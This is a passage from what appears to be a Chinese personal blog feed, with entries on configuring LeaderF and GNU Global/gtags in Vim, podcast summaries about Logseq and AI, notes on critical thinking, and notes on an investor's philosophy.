class="hljs-number">1</span><br></code></pre></td></tr></table></figure><ul><li>g:Lf_GtagsSource 设置 gtags 的目标文件，设置为 2 通过执行外部命令判断目标文件 （例如 <code>git ls-files</code>）</li><li>g:Lf_GtagsAutoGenerate  是否自动生成 tags 文件。设置成 1 并且在 g:Lf_RootMarkers 定义的目录中，tags 会自动生成</li><li>g:Lf_GtagsAutoUpdate 是否自动更新 tags。如果设置成 0 ，需要先执行 <code>Leaderf gtags --update</code> 手动更新 tags 文件</li></ul><p>tags 文件生成的目录和 <code>g:Lf_CacheDirectory</code> 的配置相关， g:Lf_CacheDirectory 用于设置缓存文件目录，默认的目录是 $HOME (Windows 上会有变化)使用 <code>_</code> 替换了 <code>/</code> 。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> ~/.LfCache/gtags/_home_henices_.vim <br>GPATH  GRTAGS  GTAGS<br></code></pre></td></tr></table></figure><p>新版本的 LeaderF，g:Lf_CacheDirectory 的默认值发生了变化，Linux 系统一般为 <code>~/.cache/LeaderF</code>，详情如下：</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">g:</span>Lf_CacheDirectory                              *g:Lf_CacheDirectory*<br>    <span class="hljs-keyword">Set</span> this <span class="hljs-keyword">option</span> <span class="hljs-keyword">to</span> change the location <span class="hljs-keyword">of</span> the cache directory.<br>    e.g. &gt;<br>    <span class="hljs-keyword">let</span> g:Lf_CacheDirectory = <span class="hljs-comment">&#x27;/root&#x27;</span><br>&lt;<br>    <span class="hljs-keyword">On</span> Windows, <span class="hljs-keyword">default</span> value <span class="hljs-built_in">is</span> <span class="hljs-comment">&#x27;%APPDATA%&#x27;.</span><br>    <span class="hljs-keyword">On</span> Linux, <span class="hljs-keyword">default</span> value <span class="hljs-built_in">is</span> <span class="hljs-comment">&#x27;$XDG_CACHE_HOME&#x27; if $XDG_CACHE_HOME is defined,</span><br>    otherwise, <span class="hljs-keyword">default</span> value <span class="hljs-built_in">is</span> <span class="hljs-comment">&#x27;$HOME/.cache&#x27;.</span><br></code></pre></td></tr></table></figure><p>完成了上面的配置后，我们就可以正常使用 LeaderF 来对 gtags 生成的 tags 文件进行浏览了，在命令行使用 <code>:Leaderf gtags -h</code> 可以看到详细的命令。</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs prolog">:<span class="hljs-symbol">Leaderf</span> gtags -h<br>usage:<br><span class="hljs-symbol">Leaderf</span>[!] gtags [-h] [--remove] [--recall]<br><span class="hljs-symbol">Leaderf</span>[!] gtags --update [--gtagsconf &lt;<span class="hljs-symbol">FILE</span>&gt;] [--gtagslabel &lt;<span class="hljs-symbol">LABEL</span>&gt;] [--accept-dotfiles]<br>                 [--skip-unreadable] [--skip-symlink [&lt;<span class="hljs-symbol">TYPE</span>&gt;]] [--gtagslibpath &lt;<span class="hljs-symbol">PATH</span>&gt; [&lt;<span class="hljs-symbol">PATH</span>&gt; ...]]<br><span class="hljs-symbol">Leaderf</span>[!] gtags [--current-buffer | --all-buffers | --all] [--result &lt;<span class="hljs-symbol">FORMAT</span>&gt;] [<span class="hljs-symbol">COMMON_OPTIONS</span>]<br><span class="hljs-symbol">Leaderf</span>[!] gtags -d &lt;<span class="hljs-symbol">PATTERN</span>&gt; [--auto-jump [&lt;<span class="hljs-symbol">TYPE</span>&gt;]] [-i] [--literal] [--path-style &lt;<span class="hljs-symbol">FORMAT</span>&gt;] [-<span class="hljs-symbol">S</span> &lt;<span class="hljs-symbol">DIR</span>&gt;]<br>                 [--append] [--match-path] [--gtagsconf &lt;<span class="hljs-symbol">FILE</span>&gt;] [--gtagslabel &lt;<span class="hljs-symbol">LABEL</span>&gt;] [<span class="hljs-symbol">COMMON_OPTIONS</span>]<br><span class="hljs-symbol">Leaderf</span>[!] gtags -r &lt;<span class="hljs-symbol">PATTERN</span>&gt; [--auto-jump [&lt;<span class="hljs-symbol">TYPE</span>&gt;]] [-i] [--literal] [--path-style &lt;<span class="hljs-symbol">FORMAT</span>&gt;] [-<span class="hljs-symbol">S</span> &lt;<span class="hljs-symbol">DIR</span>&gt;]<br>                 [--append] [--match-path] [--gtagsconf &lt;<span class="hljs-symbol">FILE</span>&gt;] [--gtagslabel &lt;<span class="hljs-symbol">LABEL</span>&gt;] [<span class="hljs-symbol">COMMON_OPTIONS</span>]<br><span class="hljs-symbol">Leaderf</span>[!] gtags -s &lt;<span class="hljs-symbol">PATTERN</span>&gt; [-i] [--literal] [--path-style &lt;<span class="hljs-symbol">FORMAT</span>&gt;] [-<span class="hljs-symbol">S</span> &lt;<span class="hljs-symbol">DIR</span>&gt;] [--append]<br>                 [--match-path] [--gtagsconf &lt;<span class="hljs-symbol">FILE</span>&gt;] [--gtagslabel &lt;<span class="hljs-symbol">LABEL</span>&gt;] [<span class="hljs-symbol">COMMON_OPTIONS</span>]<br><span class="hljs-symbol">Leaderf</span>[!] gtags -g &lt;<span class="hljs-symbol">PATTERN</span>&gt; [-i] [--literal] [--path-style &lt;<span class="hljs-symbol">FORMAT</span>&gt;] [-<span class="hljs-symbol">S</span> &lt;<span class="hljs-symbol">DIR</span>&gt;] [--append]<br>                 [--match-path] [--gtagsconf &lt;<span class="hljs-symbol">FILE</span>&gt;] [--gtagslabel &lt;<span class="hljs-symbol">LABEL</span>&gt;] [<span class="hljs-symbol">COMMON_OPTIONS</span>]<br><span class="hljs-symbol">Leaderf</span>[!] gtags --by-context [--auto-jump [&lt;<span class="hljs-symbol">TYPE</span>&gt;]] [-i] [--literal] [--path-style &lt;<span class="hljs-symbol">FORMAT</span>&gt;] [-<span class="hljs-symbol">S</span> &lt;<span class="hljs-symbol">DIR</span>&gt;]<br>                 [--append] [--match-path] [--gtagsconf &lt;<span class="hljs-symbol">FILE</span>&gt;] [--gtagslabel &lt;<span class="hljs-symbol">LABEL</span>&gt;] [<span class="hljs-symbol">COMMON_OPTIONS</span>]<br>[<span class="hljs-symbol">COMMON_OPTIONS</span>]: [--reverse] [--stayOpen] [--input &lt;<span class="hljs-symbol">INPUT</span>&gt; | --cword]<br>                  [--top | --bottom | --left | --right | --belowright | --aboveleft | --fullScreen]<br>                  [--nameOnly | --fullPath | --fuzzy | --regexMode] [--nowrap] [--next | --previous]<br><br>...<br></code></pre></td></tr></table></figure><p>LeaderF gtags 最常用的 <code>:Leaderf[!] gtags -d/-r/-s/-g</code>， 具体的作用如下所示，<code>!</code> 表示直接进入 normal 模式。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs vim">--gtagslibpath <span class="hljs-symbol">&lt;PATH&gt;</span> [<span class="hljs-symbol">&lt;PATH&gt;</span> ...]<br>                      Specify the paths <span class="hljs-keyword">to</span> <span class="hljs-built_in">search</span> <span class="hljs-keyword">for</span> library functions.<br>-d <span class="hljs-symbol">&lt;PATTERN&gt;</span>, --definition <span class="hljs-symbol">&lt;PATTERN&gt;</span><br>                      Show locations of definitions.<br>-r <span class="hljs-symbol">&lt;PATTERN&gt;</span>, --reference <span class="hljs-symbol">&lt;PATTERN&gt;</span><br>                      Show reference <span class="hljs-keyword">to</span> <span class="hljs-keyword">a</span> symbol which <span class="hljs-built_in">has</span> definitions.<br>-s <span class="hljs-symbol">&lt;PATTERN&gt;</span>, --symbol <span class="hljs-symbol">&lt;PATTERN&gt;</span><br>                      Show reference <span class="hljs-keyword">to</span> <span class="hljs-keyword">a</span> symbol which <span class="hljs-built_in">has</span> <span class="hljs-keyword">no</span> definition.<br>-g <span class="hljs-symbol">&lt;PATTERN&gt;</span>, --<span class="hljs-keyword">grep</span> <span class="hljs-symbol">&lt;PATTERN&gt;</span><br></code></pre></td></tr></table></figure><p>日常使用中，同样可以配置快捷键方便使用，下面的快捷键将对光标所在单词进行 tag 查找。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">nmap &lt;leader&gt;fgd &lt;Plug&gt;LeaderfGtagsDefinition<br>nmap &lt;leader&gt;fgr &lt;Plug&gt;LeaderfGtagsReference<br>nmap &lt;leader&gt;fgs &lt;Plug&gt;LeaderfGtagsSymbol<br>nmap &lt;leader&gt;fgg &lt;Plug&gt;LeaderfGtagsGrep<br></code></pre></td></tr></table></figure><h3 id="运行-LeaderF-gtags-之后"><a href="#运行-LeaderF-gtags-之后" class="headerlink" title="运行 LeaderF gtags 之后"></a>运行 LeaderF gtags 之后</h3><p>使用 LeaderF + gtags 跳转到源码后，如果想继续跳转到下一个或者上一个 tag 可以使用 <code>Leaderf gtags --next</code> 和 <code>Leaderf gtags --previous</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><br>noremap &lt;leader&gt;fgn :&lt;C-U&gt;&lt;C-R&gt;=<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Leaderf gtags --next %s&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)&lt;CR&gt;&lt;CR&gt;<br>noremap &lt;leader&gt;fgp :&lt;C-U&gt;&lt;C-R&gt;=<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Leaderf gtags --previous %s&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)&lt;CR&gt;&lt;CR&gt;<br></code></pre></td></tr></table></figure><h2 id="☆-LeaderF-的其他用法"><a href="#☆-LeaderF-的其他用法" class="headerlink" title="☆ LeaderF 的其他用法"></a>☆ LeaderF 的其他用法</h2><p>LeaderF 还可以和 <a href="https://github.com/ludovicchabant/vim-gutentags">Gutentags</a> 配合使用进行源码浏览，但已经超出本文内容，有兴趣者可以查阅网络上的其他资料。</p><h2 id="☆-参考资料"><a href="#☆-参考资料" class="headerlink" title="☆ 参考资料"></a>☆ 参考资料</h2><p><a href="https://github.com/Yggdroot/LeaderF/blob/master/doc/leaderf.txt">https://github.com/Yggdroot/LeaderF/blob/master/doc/leaderf.txt</a><br><a href="https://retzzz.github.io/dc9af5aa/">https://retzzz.github.io/dc9af5aa/</a><br><a href="https://github.com/Yggdroot/LeaderF/blob/master/README.md">https://github.com/Yggdroot/LeaderF/blob/master/README.md</a><br><a href="https://zhuanlan.zhihu.com/p/36279445">https://zhuanlan.zhihu.com/p/36279445</a><br><a href="https://github.com/vim/vim/blob/master/runtime/doc/popup.txt">https://github.com/vim/vim/blob/master/runtime/doc/popup.txt</a><br><a href="https://neovim.io/doc/user/api.html#api-floatwin">https://neovim.io/doc/user/api.html#api-floatwin</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Programming</tag>
      
      <tag>vim</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>对话logseq联合创始人，看硅谷大佬的传奇投资 总结</title>
    <link href="/cn/logseq_interview/"/>
    <url>/cn/logseq_interview/</url>
    
    <content type="html"><![CDATA[<p><a href="https://pca.st/x398eeq0">https://pca.st/x398eeq0</a></p><ol><li>技术招聘时，有 side project 的优先，认为有 side project 的技术人员大多有自己独特的想法，自驱力也较强。</li><li>强调技术热情和学习能力，小众语言会的人不多，但是语言不是主要问题。对于对新技术充满热情和好奇心的技术人来说学习就可以了。</li><li>自由开放的团队文化，大都是技术人员，相互之间比较平等，和社区沟通交流紧密。没有明确的 deadline，但大家都比较努力，工作任务分配以兴趣自领为主指派为辅。</li><li>没有太多的营销，产品定位和路线也是逐渐明确，最开始是从秦天生的一个 side project 慢慢发展起来。也没有定量分析过产品用户爆炸性增长的原因，只有模糊的感觉，Logseq 内置 PDF 阅读和标注感觉是一个突破点。</li><li>Logseq 团队关于远程工作的一些实践，志远认为在一个国际团队中远程工作需要克服时差问题，需要讨论问题的时候比较麻烦。解决的方式是写比较详细的 issue 复现文档，基本是 step by step 的。讨论想法多录制一些演示视频，有问题就直接给对方发消息不能马上回复也问题不大，很多事情没有想象中的重要。</li><li>Logseq 团队协作的主要工具，代码问题和 issue 管理使用 Github，问题讨论使用 Discord + 论坛 （Discord 处理即时反馈，论坛主要用来较长时间的讨论）， 团队内部的通讯工具使用 Slack。</li></ol><p>Logseq 的投资人非常豪华,我查了一下有 Stripe 首席执行官 Patrick Collison、GitHub 前首席执行官 Nat Friedman、Shopify 创始人 Tobias Lütke、A16Z 总经理 Sriram Krishnan等人，更神奇的是他们大多也是 Logseq 的用户。</p><p>听完这期博客，我感觉陈志远是非常纯粹的技术人员，谦逊内敛，对技术充满热爱，喜欢用技术解决现实生活中的问题。坚持自己的产品定位，不浮躁不傲娇，长期认真地完善产品功能，不为短期的生存而感到焦虑，这或许就是小而美的团队的优势吧。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Programming</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>训练思维，判断观点</title>
    <link href="/cn/zhengweizhongyao/"/>
    <url>/cn/zhengweizhongyao/</url>
    
    <content type="html"><![CDATA[<ol><li><p>避免过度解读</p><ul><li>好的思维方式大体符合《孙子兵法》中「以正合，以奇胜」，这里的奇是机动兵力的意思。我们在了解事情的时候，首先要理解主流观点，这样我们做事才有坚实的起点，一上来就看非主流观点，很可能就丢掉了根本而陷入旁支细节去了。</li></ul></li><li><p>证伪比证实更重要</p><ul><li>人类对世界的认知都是片面的，只是不断地接近真理。很多你认为可以自洽，可以理解的原因，可能不是真正的原因，并不是因果关系，甚至可能都不是相关关系。</li><li>把错误的原因当成真正的原因，要倒大霉。一定要小心无法证伪的推论，一个事情成功的因素可以有很多，都可以解释的通。</li><li>常识之所以重要是因为经过了长时间的证实和证伪是可靠的结论，遵循常识就可以避开很多的错误和陷阱</li></ul></li><li><p>判定利益冲突</p><ul><li>当发表意见的人和所讨论的主题利益相关，那么其结可能就会有明显的偏向性。</li><li>使用逻辑过滤信息和结论</li><li>得出问题结论的推理过程需要符合逻辑，不能依靠想象。</li></ul></li><li><p>利用成本思维进行判断</p><ul><li>做任何事情都有成本，当接受的信息太多的时候，可以用成本因素进行过滤，通过成本来思考人们做事的初衷和理由是有效的。</li></ul></li></ol><p>#硅谷来信 #吴军</p>]]></content>
    
    
    
    <tags>
      
      <tag>KNOWLEDGE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>认知被 AI 暴击的瞬间</title>
    <link href="/cn/ai_thinking/"/>
    <url>/cn/ai_thinking/</url>
    
    <content type="html"><![CDATA[<p><a href="https://podcasts.apple.com/us/podcast/%E8%AE%A4%E7%9F%A5%E8%A2%ABai%E6%9A%B4%E5%87%BB%E7%9A%84%E7%9E%AC%E9%97%B4/id1614381317?i=1000598827531">https://podcasts.apple.com/us/podcast/%E8%AE%A4%E7%9F%A5%E8%A2%ABai%E6%9A%B4%E5%87%BB%E7%9A%84%E7%9E%AC%E9%97%B4/id1614381317?i=1000598827531</a></p><p>今天听了一期「认知被 AI 暴击的瞬间》，里面有几个挺有意思的话题 。</p><h2 id="“AGI”技术目前存在的哪些问题-？"><a href="#“AGI”技术目前存在的哪些问题-？" class="headerlink" title="“AGI”技术目前存在的哪些问题  ？"></a>“AGI”技术目前存在的哪些问题  ？</h2><p>首先是算力的问题，早期大家在使用 ChatGPT 的时候应该都遇上了无法响应的情况，包括后来大范围的封号，限制特定机房 IP 段的访问，这些其实都是算力不足的表现。虽然 Google 号称 PaLM 2 的 Gecko 模型可以在手机上运行，具体的文本生成效果和能量消耗情况都没有详细的信息。</p><p>其次，ChatGPT 这些 Ai 程序生成的内容并不总能满足需求，有时候甚至觉得有点傻，受限于学习的数据和算法模型，人工智能领域正在挑战其不太擅长的通用人工智能，在专用人工智能方面（比如下围棋）的许多地方，人类早已经不是对手了。</p><p>最后，AGI 程序是不能有「价值判断」的，没有价值观就可能生成有害的内容，这些内容甚至可能对人类产生威胁。</p><h2 id="人脑和“Ai脑”工作方式的主要区别-？"><a href="#人脑和“Ai脑”工作方式的主要区别-？" class="headerlink" title="人脑和“Ai脑”工作方式的主要区别 ？"></a>人脑和“Ai脑”工作方式的主要区别 ？</h2><p>人脑的特点是以很低的功耗快速响应，这就是人们喜欢宏大叙事和模式识别的原因。按照康德哲学的观念「人为自然界立法」，客观对象即人的认识对象不是在那里等着你去认识，而是由你的认识过程能动地建立起一个对象。</p><p>大语言模型 (LLM)则是通过对大规模语料库的训练和自然语言处理技术的应用，使得模型能够理解和生成自然语言，并能够执行各种语言任务，如文本生成、机器翻译、语音识别等。</p><h2 id="人类应该担心被-Ai-取代，甚至还有点恐惧吗-？"><a href="#人类应该担心被-Ai-取代，甚至还有点恐惧吗-？" class="headerlink" title="人类应该担心被 Ai 取代，甚至还有点恐惧吗 ？"></a>人类应该担心被 Ai 取代，甚至还有点恐惧吗 ？</h2><p>首先，我们应该充分利用 Ai 的能力来完成各种任务，Ai 应该作为人类的 「副驾」而非竞争对手。在国际象棋上出现了人和 ai 相结合的程序，自动判断什么情况用 Ai 判断，什么情况用人类判断，据说打败了不少 master 模型。</p><p>Will 老师则提出一个「工具人」概念，只能执行任务没有自己的思想就是工具人。人类和 Ai 的关系可以简单地理解为把机器的工作还给机器，这也会带来生产力的大幅提高。</p><p>另外，Ai 是没有价值判断和整合能力的，Ai 可以快速阅读财务报表，快速生成各种基面本信息，但是问 Ai 到底该投资哪家公司，你能相信 Ai 的结论吗 ？或者你用 Ai 生成了一份投研报告交给老板，老板觉得挺好，但可能还是会问你具体的看法，这或许又回到了另一个问题，真的就完全相信 Ai 吗 </p>]]></content>
    
    
    
    <tags>
      
      <tag>ai</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>韩广斌讲投资</title>
    <link href="/cn/interview_guangbinHan/"/>
    <url>/cn/interview_guangbinHan/</url>
    
    <content type="html"><![CDATA[<p>韩广斌在采访中提及两个和投资相关的重要概念，沉没成本 和 幸存者偏差。</p><p>沉没成本，指已经发生的不可回收的成本，从理性角度讲和当前决策无关，而实际上却对人的决策有重大影响。受沉没成本的影响，人们可能无法迅速纠正错误，无法快速砍仓。假设买入茅台时50元，茅台涨到100元，成本就是100元了，应该基于当下去评估。</p><p>幸存者偏差，属于典型的归因错误。解释没有意义，正确的预测才有价值。常见有人说我几年前看好宁德时代，宁德时代也涨了，但是上涨的原因很可能不是人们所说的原因。只有立足当下，对行业发展、公司评估、财务分析等方面有自己独到的见解，才能取得超额的收益。</p><p>韩广斌在采访中解释了搞清楚似是而非的问题的重要性，似是而非的问题和幸存者偏差有关，需要明白事物的深层次原因。明显正确和明显错误的问题都比较容易理解，关键就是似是而非的问题，重点分析似是而非的问题，使得你对事物的理解和他人相比所有不同。这些不同的理解就是投资成功的关键，有时候是预期差，也可能是其他不同的看法。</p><p>解决「似是而非」问题的方法，首先要意识到人的认知是存在偏见的，要以开放的思维和心态去看待问题。开放意味着要去倾听别人的意见和市场的声音，如果反馈和设想的不一致就要反思自己的投资逻辑，投资的过程也是不断“纠错”的过程。但投资中需要过滤小的噪音，避免陷于细节而不可自拔，抓住主要矛盾，主要关注大的错误。</p><p>从采访的内容看和林园相比韩广斌更像是价值投资者，看韩广斌早期的视频，总结了一下他的投资理念：<br>长期价值投资者，投资未来的绩优股，回避问题股，公司的管理层很重要 （诚实、正直），追求确定性和回报率。</p><p>韩广斌说在国内，好的企业家太少，大多数公司的管理者是老板。<br>他心目中好公司的定义：好的行业，好的业绩，好的管理层，对员工好，对股东也好。</p><p>新思哲在平时构建可投资的股票池，根据不同的周期选择不同的股票形成投资组合，组合中的股票较为分散在一定程度上形成对冲，从而使业绩更加平滑。在追求回报率上，我觉得和私募有关系，希望通过业绩来扩大规模，另外目前新思哲的规模还是不太大，可以较为快速地调整策略。</p><p>韩广斌的「养猪理论」，猪从50斤长到200斤的成长速度是最快的，投资公司最好选择上市公司竞争优势形成并且成长加速的阶段介入，重点投资公司从优秀到卓越的过程。</p><p>韩广斌对投资者的一些建议：</p><ul><li>坚持长期主义: 相信把一些本分、基础的事情做好，长期能带来可观的回报。</li><li>做预期可控的投资: 投资最重要的是做 1.2的n次方，20%的回报率，经过努力、专业的操作可以做到。</li><li>复利主义: 资金在滚雪球的过程中，心态要平和，追求长期的复利，慢就是快</li><li>慎用杠杆: 算清帐，有些 P2P 年化融资成本高达 18%，既使是专业机构也很难保持这个水平</li><li>与优秀者同伍: 好的投资机会不多，所以一定要和最优秀的人打交道，和最优秀的企业家打交道。</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>investment</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GNU Global 的使用</title>
    <link href="/cn/gtags-cscope/"/>
    <url>/cn/gtags-cscope/</url>
    
    <content type="html"><![CDATA[<h2 id="☆-1-GNU-Global-简介"><a href="#☆-1-GNU-Global-简介" class="headerlink" title="☆ 1. GNU Global 简介"></a>☆ 1. GNU Global 简介</h2><p>GNU Global 是一种源代码标记系统，可以帮助程序员在代码库中快速定位函数、变量、宏定义等。GNU Global 可以生成索引文件，用于快速跳转到定义、引用、函数调用等地方，从而提高代码阅读和编辑的效率。</p><p>GNU global 具有以下优势：</p><ol><li>多语言支持：在默认情况 GNU Global 支持 C, C++, Yacc, Java, PHP4 和 assembly 语言，在安装拓展的情况下可以支持 50多种语言。</li><li>完整性：GNU global 可以标记更多符号的位置，如定义、引用、结构体、类，宏定义等。</li><li>高效性：GNU global 生成高效的 tag 数据库，节省了磁盘空间，使得查询速度更快，同时也支持增量更新索引文件，这意味着当源代码发生变化时，只需要重新生成变更的部分，而不需要重新生成整个索引文件。</li><li>可集成：可以在 Emacs, Vi &#x2F;vim,  Less viewer, Bash shell， 浏览器环境下正常使用</li><li>持续更新： <a href="https://www.gnu.org/software/global/whatsnew.html">https://www.gnu.org/software/global/whatsnew.html</a></li></ol><p>更多信息请参考： <a href="https://www.gnu.org/software/global/globaldoc_toc.html">https://www.gnu.org/software/global/globaldoc_toc.html</a> 1.3 Features</p><h2 id="☆-2-GNU-Global-的安装"><a href="#☆-2-GNU-Global-的安装" class="headerlink" title="☆ 2. GNU Global 的安装"></a>☆ 2. GNU Global 的安装</h2><p>下载地址： <a href="https://ftp.gnu.org/pub/gnu/global/global-6.6.9.tar.gz">https://ftp.gnu.org/pub/gnu/global/global-6.6.9.tar.gz</a></p><p><a href="https://www.gnu.org/software/global/download.html">https://www.gnu.org/software/global/download.html</a> 中说明了源码编译方法：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">% sh reconf.sh <br>% ./configure<br>% make<br></code></pre></td></tr></table></figure><p>Fedora&#x2F;Debian 等系统可以使用仓库直接安装，下面以 Fedora Linux 为例</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo dnf install <span class="hljs-keyword">global</span>-ctags <span class="hljs-keyword">global</span> <span class="hljs-keyword">cscope</span><br></code></pre></td></tr></table></figure><p>如果不安装 <code>global-ctags</code> 在 Fedora 下可能会报 <code>Cannot enable custom plug-in parser for GNU GLOBAL</code> 的错误。</p><p>gtags-cscope 由 global 安装包提供不用另外安装了。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo dnf whatprovides gtags-<span class="hljs-keyword">cscope</span><br><br><span class="hljs-keyword">global</span>-<span class="hljs-number">6.6</span>.<span class="hljs-number">5</span>-<span class="hljs-number">7</span>.fc37.x86_64 : Source code <span class="hljs-keyword">tag</span> <span class="hljs-built_in">system</span><br>仓库        ：@System<br>匹配来源：<br>文件名    ：/usr/bin/gtags-<span class="hljs-keyword">cscope</span><br><br><span class="hljs-keyword">global</span>-<span class="hljs-number">6.6</span>.<span class="hljs-number">5</span>-<span class="hljs-number">7</span>.fc37.x86_64 : Source code <span class="hljs-keyword">tag</span> <span class="hljs-built_in">system</span><br>仓库        ：fedora<br>匹配来源：<br>文件名    ：/usr/bin/gtags-<span class="hljs-keyword">cscope</span><br></code></pre></td></tr></table></figure><p>macOS 下可以使用 brew 安装 global，执行 <code>brew install global</code> 即可。<br>参见 <a href="https://www.gnu.org/software/global/download.html">https://www.gnu.org/software/global/download.html</a></p><p>如果需要gtags支持 C&#x2F;C++&#x2F;Java 之外的语言，需要安装 <code>pygments</code>。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">pip3 install pygments<br></code></pre></td></tr></table></figure><h2 id="☆-3-GNU-global-和-cscope-vim-集成"><a href="#☆-3-GNU-global-和-cscope-vim-集成" class="headerlink" title="☆ 3.  GNU global 和 cscope, vim 集成"></a>☆ 3.  GNU global 和 cscope, vim 集成</h2><p>vim 的 cscope 支持可能需要重新编译 vim，可以通过下面的命令查询。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">vim --version | grep cscope<br>+cscope            +localmap          +ruby/dyn          +wildignore<br></code></pre></td></tr></table></figure><p>GNU global 提供了两个 vim 插件用于和 vim 结合，分别为 gtags.vim 和 gtags-cscope.vim，可以直接拷贝到 vim 的插件目录使用。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cp</span> /usr/local/share/gtags/gtags.vim <span class="hljs-variable">$HOME</span>/.vim/plugin<br><span class="hljs-built_in">cp</span> /usr/local/share/gtags/gtags-cscope.vim <span class="hljs-variable">$HOME</span>/.vim/plugin<br></code></pre></td></tr></table></figure><p>如果是系统仓库安装路径可能有变化，Fedora 上的 gtags.vim 路径为 <code>/usr/share/gtags/gtags.vim</code> 。</p><p>gtags-cscope.vim 定义了一组快捷键和以前的 <code>cscope_maps.vim</code> 一致</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sh">:nmap &lt;C-\&gt;s :cs find s &lt;C-R&gt;=<span class="hljs-built_in">expand</span>(<span class="hljs-string">&quot;&lt;cword&gt;&quot;</span>)&lt;CR&gt;&lt;CR&gt;<br>:nmap &lt;C-\&gt;g :cs find g &lt;C-R&gt;=<span class="hljs-built_in">expand</span>(<span class="hljs-string">&quot;&lt;cword&gt;&quot;</span>)&lt;CR&gt;&lt;CR&gt;<br>:nmap &lt;C-\&gt;c :cs find c &lt;C-R&gt;=<span class="hljs-built_in">expand</span>(<span class="hljs-string">&quot;&lt;cword&gt;&quot;</span>)&lt;CR&gt;&lt;CR&gt;<br>:nmap &lt;C-\&gt;t :cs find t &lt;C-R&gt;=<span class="hljs-built_in">expand</span>(<span class="hljs-string">&quot;&lt;cword&gt;&quot;</span>)&lt;CR&gt;&lt;CR&gt;<br>:nmap &lt;C-\&gt;e :cs find e &lt;C-R&gt;=<span class="hljs-built_in">expand</span>(<span class="hljs-string">&quot;&lt;cword&gt;&quot;</span>)&lt;CR&gt;&lt;CR&gt;<br>:nmap &lt;C-\&gt;f :cs find f &lt;C-R&gt;=<span class="hljs-built_in">expand</span>(<span class="hljs-string">&quot;&lt;cfile&gt;&quot;</span>)&lt;CR&gt;&lt;CR&gt;<br>:nmap &lt;C-\&gt;i :cs find i &lt;C-R&gt;=<span class="hljs-built_in">expand</span>(<span class="hljs-string">&quot;&lt;cfile&gt;&quot;</span>)&lt;CR&gt;&lt;CR&gt;<br>:nmap &lt;C-\&gt;a :cs find a &lt;C-R&gt;=<span class="hljs-built_in">expand</span>(<span class="hljs-string">&quot;&lt;cword&gt;&quot;</span>)&lt;CR&gt;&lt;CR&gt;<br></code></pre></td></tr></table></figure><p>gtags-cscope.vim 的使用注释里有详细的说明：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 